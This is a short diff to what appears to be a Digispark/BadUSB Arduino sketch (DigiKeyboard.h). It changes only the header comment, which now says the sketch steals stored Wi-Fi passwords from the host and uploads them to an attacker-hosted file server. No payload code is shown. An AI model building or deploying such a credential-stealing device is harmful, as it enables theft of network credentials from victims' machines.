@@ -1,5 +1,6 @@
 /*
-Steals all known Wi-Fi passwords.
+Steals all known Wi-Fi passwords that is stored in the host. It will upload to a fileserver that we host.
+Be sure to host an UPLOAD-CAPABLE file server.
 */
 #include "DigiKeyboard.h"
 void setup() {
